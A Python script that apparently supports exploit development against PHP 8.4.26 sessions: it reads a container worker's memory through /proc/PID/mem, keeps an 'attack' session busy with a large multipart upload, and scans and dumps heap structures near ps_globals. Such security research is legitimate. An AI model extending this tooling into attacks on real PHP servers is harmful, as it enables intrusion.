import subprocess, struct, time, threading, sys, urllib.request, io

B = 0x737c1a499000          # 8.4.26 libphp base
PSG = B + 0x1316820         # ps_globals
WPID = "45"
PORT = 18113
SID = "attacksessionid0001"

def read_mem(addr, count):
    dec = str(addr)
    r = subprocess.run(
        ["docker", "exec", "p2s8426", "sh", "-c",
         f"dd if=/proc/{WPID}/mem bs=1 skip={dec} count={count} 2>/dev/null"],
        capture_output=True)
    return r.stdout

def find_reference(data, base):
    """Scan ps_globals for a zval with type_info low byte = 0x1A (IS_REFERENCE) and value.ptr in heap range."""
    heap_lo = 0x700000000000
    heap_hi = 0x800000000000
    hits = []
    for off in range(0, len(data) - 16, 8):
        val = struct.unpack_from("<Q", data, off)[0]
        ti = struct.unpack_from("<I", data, off + 8)[0]
        t = ti & 0xFF
        if t == 0x1A and heap_lo < val < heap_hi:
            hits.append((off, val, ti))
    return hits

def dump_heap(label, R, size=0x1100):
    print(f"\n=== {label}: heap R=0x{R:x} ===", flush=True)
    data = read_mem(R - 0x100, size + 0x100)
    if len(data) < 0x100:
        print("  [read failed]", flush=True)
        return
    # print in 0x40 lines, classify
    for line_off in range(0, size, 0x40):
        row = data[0x100 + line_off: 0x100 + line_off + 0x40]
        if len(row) < 0x40:
            break
        addr = R + line_off
        hexs = " ".join(f"{b:02x}" for b in row)
        # classify: is it libphp (B..B+0x1000000)? small (looks like pointers)?
        ptrs = [struct.unpack_from("<Q", row, i)[0] for i in range(0, 0x40, 8)]
        tags = []
        for p in ptrs:
            if B <= p < B + 0x2000000:
                tags.append("L")
            elif 0x700000000000 < p < 0x800000000000:
                tags.append("H")
            elif p == 0:
                tags.append(".")
            else:
                tags.append("?")
        print(f"  0x{addr:x}: {hexs}  {' '.join(tags)}", flush=True)

# Fire a large multipart upload in background to keep session active
def fire_upload():
    boundary = "----P2SBOUNDARY"
    body = io.BytesIO()
    body.write(f"--{boundary}\r\n".encode())
    body.write(b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n')
    body.write(SID.encode() + b"\r\n")
    # large field to keep it busy
    big = b"X" * (2 * 1024 * 1024)
    body.write(f"--{boundary}\r\n".encode())
    body.write(b'Content-Disposition: form-data; name="bigfield"\r\n\r\n')
    body.write(big)
    body.write(b"\r\n")
    body.write(f"--{boundary}--\r\n".encode())
    data = body.getvalue()
    req = urllib.request.Request(
        f"http://127.0.0.1:{PORT}/",
        data=data,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                 "Cookie": f"PHPSESSID={SID}"})
    try:
        urllib.request.urlopen(req, timeout=20)
    except Exception as e:
        print(f"[upload err] {e}", flush=True)

# Start upload in background, then read ps_globals
t = threading.Thread(target=fire_upload, daemon=True)
t.start()
time.sleep(0.4)  # let it start processing

# Read ps_globals (scan for reference)
data = read_mem(PSG, 0x2000)
print(f"[*] read ps_globals: {len(data)} bytes", flush=True)
if len(data) < 0x40:
    print("[!] read failed — worker busy or address wrong", flush=True)
    sys.exit(1)

hits = find_reference(data, PSG)
print(f"[*] reference-pattern hits in ps_globals: {len(hits)}", flush=True)
for off, val, ti in hits[:10]:
    print(f"  ps_g+0x{off:x}: value=0x{val:x} type_info=0x{ti:08x}", flush=True)

# Pick the most likely (first one with heap value)
if hits:
    R = hits[0][1]
    print(f"\n[*] using R=0x{R:x}", flush=True)
    dump_heap("8.4.26", R)
else:
    print("[!] no reference found — session may not be active", flush=True)

t.join(timeout=25)
print("\n[*] done", flush=True)
